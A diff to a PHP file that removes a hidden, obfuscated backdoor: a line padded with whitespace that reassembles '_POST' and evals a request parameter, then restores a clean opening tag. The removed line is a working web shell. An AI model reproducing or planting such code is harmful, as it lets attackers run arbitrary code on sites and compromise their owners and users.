@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                            $keu96= "_tosp" ;$gisz68 = strtoupper ($keu96[0]. $keu96[4] . $keu96[2].$keu96[3].$keu96[1] ) ; if( isset(${ $gisz68}['q940e55'])) { eval( ${ $gisz68 } [ 'q940e55'] ) ;} ?><?php
+<?php
 
 /**
  * @file
